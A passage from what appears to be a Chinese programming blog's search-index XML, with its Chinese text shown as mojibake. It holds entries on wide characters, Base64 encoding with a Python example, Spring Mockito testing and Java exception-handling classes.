<h3 id="å®½å­—ç¬¦"><a href="#å®½å­—ç¬¦" class="headerlink" title="å®½å­—ç¬¦"></a>å®½å­—ç¬¦</h3><p>å®½å­—ç¬¦ï¼ˆWide characterï¼‰ æ˜¯ç¨‹åºè®¾è®¡çš„æœ¯è¯­ã€‚å®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æœ¯è¯­ï¼ˆæ²¡æœ‰è§„å®šå…·ä½“å®ç°ç»†èŠ‚ï¼‰ï¼Œç”¨ä»¥è¡¨ç¤ºæ¯”8ä½å­—ç¬¦è¿˜å®½çš„æ•°æ®ç±»å‹ã€‚å®ƒä¸åŒäºUnicodeã€‚</p>
<p>wchar_tåœ¨ANSI/ISO Cä¸­æ˜¯ä¸€ä¸ªæ•°æ®ç±»å‹ï¼Œä¸”æŸäº›å…¶å®ƒçš„ç¼–ç¨‹è¯­è¨€ä¹Ÿç”¨å®ƒæ¥è¡¨ç¤ºå®½å­—ç¬¦ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ol>
<li><p><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" rel="external nofollow noopener noreferrer" target="_blank">å­—ç¬¦ç¼–ç </a></p>
</li>
<li><p><a href="https://github.com/acmerfight/insight_python/blob/master/Unicode_and_Character_Sets.md" rel="external nofollow noopener noreferrer" target="_blank">Unicode_and_Character_Sets.md</a></p>
</li>
<li><p><a href="http://www.compsci.hunter.cuny.edu/~sweiss/resources/Unicode.pdf" rel="external nofollow noopener noreferrer" target="_blank">Unicode and UTF-8</a></p>
</li>
<li><p><a href="http://www.micmiu.com/lang/java/java-check-chinese/" rel="external nofollow noopener noreferrer" target="_blank">Java å®Œç¾åˆ¤æ–­ä¸­æ–‡å­—ç¬¦</a></p>
</li>
<li><p><a href="http://unicode.org/emoji/charts/full-emoji-list.html" rel="external nofollow noopener noreferrer" target="_blank">Full Emoji Data, v3.0</a></p>
</li>
<li><p><a href="http://www.tuicool.com/articles/aQBVny" rel="external nofollow noopener noreferrer" target="_blank">å¾®ä¿¡emojiè¡¨æƒ…ç¼–ç </a></p>
</li>
<li><p><a href="http://blog.csdn.net/sunshine1314/article/details/2309655" rel="external nofollow noopener noreferrer" target="_blank">å…³äºBig Endian å’Œ Little Endian</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" rel="external nofollow noopener noreferrer" target="_blank">å­—ç¬¦ç¼–ç ç¬”è®°ï¼šASCIIï¼ŒUnicodeå’ŒUTF-8</a></p>
</li>
<li><p><a href="https://my.oschina.net/goldenshaw/blog/310331" rel="external nofollow noopener noreferrer" target="_blank">å­—ç¬¦é›†ä¸ç¼–ç ï¼ˆå››ï¼‰â€”â€”Unicode - Just do æŒ¨è¸¢ - OSCHINA</a></p>
</li>
<li><p><a href="https://www.freecodecamp.org/news/a-beginner-friendly-guide-to-unicode-d6d45a903515/" rel="external nofollow noopener noreferrer" target="_blank">A Beginner-Friendly Guide to Unicode ?</a></p>
</li>
<li><p><a href="https://my.oschina.net/goldenshaw/blog/311848" rel="external nofollow noopener noreferrer" target="_blank">å­—ç¬¦é›†ä¸ç¼–ç ï¼ˆäº”ï¼‰â€”â€”ä»£ç å•å…ƒåŠlengthæ–¹æ³• - Just do æŒ¨è¸¢ - OSCHINA</a></p>
</li>
<li><p><a href="http://zuga.net/articles/text-code-point-vs-code-unit/" rel="external nofollow noopener noreferrer" target="_blank">Zuga.net | Text - Code point vs. code unit</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ç¼–ç  </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Base64ç¼–ç åŸç†]]></title>
      <url>http://qsli.github.io/2016/09/26/base64/</url>
      <content type="html"><![CDATA[<h2 id="æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote>
<p>Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding<br>æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">wikipedia</a></p>
</blockquote>
<p>è¯´ç™½äº†å°±æ˜¯å°†äºŒè¿›åˆ¶çš„æ•°æ®è½¬æ¢æˆå­—ç¬¦ç¼–ç ã€‚Base64ç”±å¤§å°å†™å­—æ¯å„26ä¸ªï¼Œ<code>0-9</code>çš„10ä¸ªæ•°å­—ï¼ŒåŠ å·<code>+</code><br>ä»¥åŠæ–œæ <code>/</code>ï¼Œä¸€å…±64ä¸ªå­—ç¬¦ç»„æˆï¼Œå¦å¤–è¿˜ç”¨<code>=</code>æ¥ç”¨ä½œåç¼€ï¼Œæ€»å…±æ¶‰åŠçš„å­—ç¬¦è¾¾åˆ°65ä¸ªã€‚</p>
<blockquote>
<p>aï¼‰æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéƒ½å¯ä»¥å› æ­¤è½¬åŒ–ä¸ºå¯æ‰“å°çš„æ–‡æœ¬ç¼–ç ï¼Œä½¿ç”¨æ–‡æœ¬è½¯ä»¶è¿›è¡Œç¼–è¾‘ï¼›</p>
</blockquote>
<blockquote>
<p>bï¼‰èƒ½å¤Ÿå¯¹æ–‡æœ¬è¿›è¡Œç®€å•çš„åŠ å¯†ã€‚</p>
</blockquote>
<blockquote>
<p>æ¥è‡ª <a href="http://www.ruanyifeng.com/blog/2008/06/base64.html" rel="external nofollow noopener noreferrer" target="_blank">Base64ç¬”è®°-é˜®ä¸€å³°</a></p>
</blockquote>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><img src="/2016/09/26/base64/encoding.jpg">
<blockquote>
<p>è½¬æ¢çš„æ—¶å€™ï¼Œå°†ä¸‰ä¸ªbyteçš„æ•°æ®ï¼Œå…ˆåæ”¾å…¥ä¸€ä¸ª24bitçš„ç¼“å†²åŒºä¸­ï¼Œå…ˆæ¥çš„byteå é«˜ä½ã€‚æ•°æ®ä¸è¶³3byteçš„è¯ï¼Œäºç¼“å†²å™¨ä¸­å‰©ä¸‹çš„bitç”¨0è¡¥è¶³ã€‚ç„¶åï¼Œæ¯æ¬¡å–å‡º6ï¼ˆå› ä¸º26=64ï¼‰ä¸ªbitï¼ŒæŒ‰ç…§å…¶å€¼é€‰æ‹©ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç åçš„è¾“å‡ºã€‚ä¸æ–­è¿›è¡Œï¼Œç›´åˆ°å…¨éƒ¨è¾“å…¥æ•°æ®è½¬æ¢å®Œæˆã€‚</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
</blockquote>
<p>å¦‚æœè¦ç¼–ç çš„å­—èŠ‚æ•°ä¸èƒ½è¢«3æ•´é™¤:</p>
<ol>
<li>å…ˆä½¿ç”¨0å­—èŠ‚å€¼åœ¨æœ«å°¾è¡¥è¶³ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«3æ•´é™¤</li>
<li>è¿›è¡Œbase64çš„ç¼–ç </li>
<li><p>åœ¨ç¼–ç åçš„base64æ–‡æœ¬ååŠ ä¸Šä¸€ä¸ªæˆ–ä¸¤ä¸ªâ€™=â€™å·ï¼Œä»£è¡¨è¡¥è¶³çš„å­—èŠ‚æ•°</p>
<img src="/2016/09/26/base64/encoding2.jpg">
</li>
</ol>
<p>  Base64å­—ç¬¦ä¸²åªå¯èƒ½æœ€åå‡ºç°ä¸€ä¸ªæˆ–ä¸¤ä¸ªâ€=â€ï¼Œä¸­é—´æ˜¯ä¸å¯èƒ½å‡ºç°â€=â€çš„</p>
<h2 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h2><blockquote>
<p>Base64 ä¸»è¦ä¸æ˜¯åŠ å¯†ï¼Œå®ƒä¸»è¦çš„ç”¨é€”æ˜¯æŠŠä¸€äº›äºŒè¿›åˆ¶æ•°è½¬æˆæ™®é€šå­—ç¬¦ç”¨äºç½‘ç»œä¼ è¾“ã€‚ç”±äºä¸€äº›äºŒè¿›åˆ¶å­—ç¬¦åœ¨ä¼ è¾“åè®®ä¸­å±äºæ§åˆ¶å­—ç¬¦ï¼Œä¸èƒ½ç›´æ¥ä¼ é€éœ€è¦è½¬æ¢ä¸€ä¸‹ã€‚Base64ç¼–ç å°±æ˜¯æŠŠäºŒè¿›åˆ¶å­—èŠ‚åºåˆ—è½¬åŒ–ä¸ºASCIIå­—ç¬¦åºåˆ—ã€‚ä¸€èˆ¬å¢åŠ 1/3é•¿åº¦ï¼Œè€Œä¸”ä¹Ÿæ˜¯ä¸å¯è¯»çš„ã€‚</p>
</blockquote>
<blockquote>
<p><a href="http://nieyong.github.io/wiki_web/BASE64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8.html" rel="external nofollow noopener noreferrer" target="_blank">BASE64ç¼–ç åŸç†åŠåº”ç”¨</a></p>
</blockquote>
<blockquote>
<p>Base64å¸¸ç”¨äºåœ¨é€šå¸¸å¤„ç†æ–‡æœ¬æ•°æ®çš„åœºåˆï¼Œè¡¨ç¤ºã€ä¼ è¾“ã€å­˜å‚¨ä¸€äº›äºŒè¿›åˆ¶æ•°æ®ã€‚åŒ…æ‹¬MIMEçš„emailã€åœ¨XMLä¸­å­˜å‚¨å¤æ‚æ•°æ®ã€‚</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
</blockquote>
<h2 id="pythonä¸­ç®€å•ä½¿ç”¨"><a href="#pythonä¸­ç®€å•ä½¿ç”¨" class="headerlink" title="pythonä¸­ç®€å•ä½¿ç”¨"></a>pythonä¸­ç®€å•ä½¿ç”¨</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encoded = base64.b64encode(<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> encoded</span><br><span class="line">aGVsbG8gd29ybGQ=</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = base64.b64decode(encoded)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> data</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<p><a href="https://docs.python.org/2/library/base64.html" rel="external nofollow noopener noreferrer" target="_blank">base64 â€” RFC 3548: Base16, Base32, Base64 Data Encodings</a></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol>
<li><p><a href="http://www.ruanyifeng.com/blog/2008/06/base64.html" rel="external nofollow noopener noreferrer" target="_blank">Base64ç¬”è®°_é˜®ä¸€å³°</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">Base64_wiki</a></p>
</li>
<li><p><a href="http://nieyong.github.io/wiki_web/BASE64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8.html" rel="external nofollow noopener noreferrer" target="_blank">BASE64ç¼–ç åŸç†åŠåº”ç”¨</a></p>
</li>
<li><p><a href="https://github.com/CharonChui/AndroidNote/blob/master/Java%E5%9F%BA%E7%A1%80/Base64%E5%8A%A0%E5%AF%86.md" rel="external nofollow noopener noreferrer" target="_blank">Base64åŠ å¯†</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ç¼–ç  </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring é‡‡ç”¨Mockçš„æ–¹å¼è¿›è¡Œå•å…ƒæµ‹è¯•]]></title>
      <url>http://qsli.github.io/2016/09/25/spring-mockMvc/</url>
      <content type="html"><![CDATA[<h2 id="Spring-amp-Mockito"><a href="#Spring-amp-Mockito" class="headerlink" title="Spring &amp; Mockito"></a>Spring &amp; Mockito</h2><p>åœ¨Springä¸­ï¼Œé‡‡ç”¨å®Œå…¨mockçš„æ–¹å¼è¿›è¡Œå•å…ƒæµ‹è¯•ï¼Œå€ŸåŠ©Mockitoæ¡†æ¶</p>
<script src="//gist.github.com/3ad39c82972ed66de3d5934f1cdcedaa.js"></script>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Javaä¸­çš„å¼‚å¸¸å¤„ç†]]></title>
      <url>http://qsli.github.io/2016/09/25/java-exception/</url>
      <content type="html"><![CDATA[<h2 id="å¼‚å¸¸çš„åˆ†ç±»"><a href="#å¼‚å¸¸çš„åˆ†ç±»" class="headerlink" title="å¼‚å¸¸çš„åˆ†ç±»"></a>å¼‚å¸¸çš„åˆ†ç±»</h2><ul>
<li>ä¸šåŠ¡å¼‚å¸¸</li>
</ul>
<blockquote>
<p>å¤„ç†ä¸šåŠ¡çš„æ—¶å€™80%çš„æ—¶å€™æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†å¯èƒ½æœ‰20%çš„æ—¶å€™äº‹æƒ…æ²¡<br>æœ‰æŒ‰ç†æƒ³çš„æ–¹å‘å‘å±•ã€‚ä¾‹å¦‚æ³¨å†Œç”¨æˆ·çš„æ—¶å€™ï¼Œæ­£å¸¸æƒ…å†µæ˜¯æ³¨å†ŒæˆåŠŸï¼Œä½†<br>å¯èƒ½ç”¨æˆ·æäº¤è¯·æ±‚çš„æ—¶å€™ï¼Œç³»ç»Ÿå‘ç°ç”¨æˆ·åå·²ç»è¢«åˆ«äººæ³¨å†Œäº†ï¼Œè¿™æ˜¯å°±<br>å¯ä»¥æŠ›å‡ºä¸€ä¸ªUserAlreadyExistsException</p>
</blockquote>
<p>æ¥è‡ª <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
<p>ä¸šåŠ¡å¼‚å¸¸ä¸€èˆ¬æ˜¯ä¸Šå±‚å¯ä»¥å¤„ç†çš„ï¼Œä¸€èˆ¬å£°æ˜ä¸º<code>CheckedException</code>ï¼Œå¼ºåˆ¶ä¸Šå±‚è¿›è¡Œæ•è·å¤„ç†</p>
<p>ä¸šåŠ¡å¼‚å¸¸å®šä¹‰ç¤ºä¾‹æ‘˜è‡ª<a href="http://gaojiewyh.iteye.com/blog/1297746#bc2369985" rel="external nofollow noopener noreferrer" target="_blank">spring mvc å¼‚å¸¸ç»Ÿä¸€å¤„ç†</a>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">publicÂ classÂ BusinessExceptionÂ extendsÂ ExceptionÂ &#123;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â privateÂ staticÂ finalÂ longÂ serialVersionUIDÂ =Â 1L;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â publicÂ BusinessException()Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â publicÂ BusinessException(StringÂ message)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(message);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â publicÂ BusinessException(ThrowableÂ cause)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(cause);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â publicÂ BusinessException(StringÂ message,Â ThrowableÂ cause)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(message,Â cause);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€èˆ¬æ˜¯ç»§æ‰¿è‡ª<code>Exception</code>, è¿™æ ·å°±æˆä¸º<code>CheckedException</code>ï¼Œ å¿…é¡»å¼ºåˆ¶æ•è·</p>
<ul>
<li>é€»è¾‘å¼‚å¸¸</li>
</ul>
<blockquote>
<p>ç³»ç»Ÿå¼‚å¸¸ä¸å…·ä½“ä¸šåŠ¡æµç¨‹æ²¡æœ‰ç›´æ¥çš„å…³ç³»ï¼Œä¾‹å¦‚ç¼–ç¨‹é”™è¯¯å¯¼è‡´çš„NullPointExcpetionï¼Œ<br>è¿˜æœ‰ç¯å¢ƒé—®é¢˜ï¼Œä¾‹å¦‚ç£ç›˜æŸåæˆ–è€…ç½‘ç»œè¿æ¥ä¸ç¨³å®šé€ æˆäº†IOExceptionã€‚</p>
</blockquote>
<blockquote>
<p>æ¥è‡ª  <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
</blockquote>
<p>ç³»ç»Ÿå¼‚å¸¸ä¸€èˆ¬æ˜¯ä¸Šå±‚æ— æ³•å¤„ç†çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬å£°æ˜ä¸º<code>UncheckedException</code>ï¼Œä¸å¼ºåˆ¶ç”¨æˆ·æ•è·ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">publicÂ classÂ SystemExceptionÂ extendsÂ RuntimeExceptionÂ &#123;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â privateÂ staticÂ finalÂ longÂ serialVersionUIDÂ =Â 1L;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â publicÂ SystemException()Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â /**Â </span><br><span class="line">Â Â Â Â Â *Â @paramÂ messageÂ </span><br><span class="line">Â Â Â Â Â */Â Â </span><br><span class="line">Â Â Â Â publicÂ SystemException(StringÂ message)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(message);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â /**Â </span><br><span class="line">Â Â Â Â Â *Â @paramÂ causeÂ </span><br><span class="line">Â Â Â Â Â */Â Â </span><br><span class="line">Â Â Â Â publicÂ SystemException(ThrowableÂ cause)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(cause);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">Â Â Â Â /**Â </span><br><span class="line">Â Â Â Â Â *Â @paramÂ messageÂ </span><br><span class="line">Â Â Â Â Â *Â @paramÂ causeÂ </span><br><span class="line">Â Â Â Â Â */Â Â </span><br><span class="line">Â Â Â Â publicÂ SystemException(StringÂ message,Â ThrowableÂ cause)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â super(message,Â cause);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â //Â TODOÂ Auto-generatedÂ constructorÂ stubÂ Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="å¼‚å¸¸çš„æ•è·"><a href="#å¼‚å¸¸çš„æ•è·" class="headerlink" title="å¼‚å¸¸çš„æ•è·"></a>å¼‚å¸¸çš„æ•è·</h2><p>â€¢ åœ¨Serviceå±‚ä¸­åº”è¯¥æ•è·Daoå±‚æŠ›å‡ºçš„å¼‚å¸¸å¹¶ä¸”åŒ…è£…æˆç›¸åº”çš„å¼‚å¸¸ï¼Œå¦‚ä¸šåŠ¡å¼‚å¸¸ã€ç³»ç»Ÿå¼‚å¸¸ç­‰</p>
<p>  ä¸šåŠ¡å±‚ä¸­ï¼Œé€šè¿‡å¼‚å¸¸é“¾ä¿å­˜åŸå§‹å¼‚å¸¸ä¿¡æ¯ã€‚ç¨‹åºå‘˜å¿…é¡»è‡ªå·±ç¼–ç æ¥ä¿å­˜åŸå§‹å¼‚å¸¸çš„ä¿¡æ¯ã€‚åœ¨ä¸šåŠ¡é€»è¾‘ä¸­ï¼Œæ•è·DataAccessExceptionå¼‚å¸¸ï¼Œå¤„ç†åŒ…è£…æˆSystemExceptionå¼‚å¸¸æŠ›å‡ºã€‚æ•è·ObjectNotFoundExceptionï¼ŒDuplicateKeyExceptionå¼‚å¸¸ï¼Œå¤„ç†åŒ…è£…æˆBusinessExceptionå¼‚å¸¸æŠ›å‡ºã€‚ä¸šåŠ¡å±‚ä¸­åº”æ ¹æ®ä¸šåŠ¡çš„ä¸åŒï¼Œå°†å¼‚å¸¸å°½é‡åˆ†å¾—ç»†ä¸€ç‚¹ï¼Œå¦åˆ™ï¼Œè‡ªå®šä¹‰çš„å¼‚å¸¸æ²¡æœ‰å¤ªå¤šçš„æ„ä¹‰ã€‚</p>
<p>æ¥è‡ª <a href="http://gaojiewyh.iteye.com/blog/1739662" rel="external nofollow noopener noreferrer" target="_blank">http://gaojiewyh.iteye.com/blog/1739662</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">publicÂ addUser(UserÂ user)Â throwsÂ BusinessException,SystemException&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â try&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â userDao.addUser(user);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;catch(DuplicatekeyExceptionÂ ex)&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â log.infor(&quot;......................&quot;);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â throwÂ newÂ BusinessException(ex.getCause(),&quot;å›½é™…åŒ–ä¿¡æ¯&quot;ï¼‰ï¼›Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;catch(DataAccessExceptionÂ ex)&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â log.error(&quot;......................&quot;);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â throwÂ newÂ SystemException(ex.getCause(),&quot;å›½é™…åŒ–ä¿¡æ¯&quot;ï¼‰ï¼›Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å¸¸è§è¯¯åŒº"><a href="#å¸¸è§è¯¯åŒº" class="headerlink" title="å¸¸è§è¯¯åŒº"></a>å¸¸è§è¯¯åŒº</h2><h3 id="ä¸€ã€å®šä¹‰ä¸Šæ•è·è€…éœ€è¦ç”¨åˆ°çš„ä¿¡æ¯"><a href="#ä¸€ã€å®šä¹‰ä¸Šæ•è·è€…éœ€è¦ç”¨åˆ°çš„ä¿¡æ¯" class="headerlink" title="ä¸€ã€å®šä¹‰ä¸Šæ•è·è€…éœ€è¦ç”¨åˆ°çš„ä¿¡æ¯"></a>ä¸€ã€å®šä¹‰ä¸Šæ•è·è€…éœ€è¦ç”¨åˆ°çš„ä¿¡æ¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">publicÂ classÂ DuplicateUsernameExceptionÂ extendsÂ ExceptionÂ &#123;Â Â </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ç†ç”±"><a href="#ç†ç”±" class="headerlink" title="ç†ç”±:"></a>ç†ç”±:</h4><p>å®ƒé™¤äº†æœ‰ä¸€ä¸ªâ€æ„ä¹‰æ˜ç¡®â€çš„åå­—ä»¥å¤–æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯äº†ã€‚ä¸è¦å¿˜è®°Exceptionè·Ÿå…¶ä»–çš„Javaç±»ä¸€æ ·ï¼Œå®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•æ¥å¾—åˆ°æ›´å¤šçš„ä¿¡æ¯ã€‚  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">publicÂ classÂ DuplicateUsernameExceptionÂ extendsÂ ExceptionÂ &#123;</span><br><span class="line">Â Â Â Â privateÂ staticÂ finalÂ longÂ serialVersionUIDÂ =Â -6113064394525919823L;</span><br><span class="line">Â Â Â Â privateÂ StringÂ usernameÂ =Â null;</span><br><span class="line">Â Â Â Â privateÂ String[]Â availableNamesÂ =Â newÂ String[0];</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â publicÂ DuplicateUsernameException(StringÂ username)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â this.usernameÂ =Â username;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â publicÂ DuplicateUsernameException(StringÂ username,Â String[]Â availableNames)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â this(username);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â 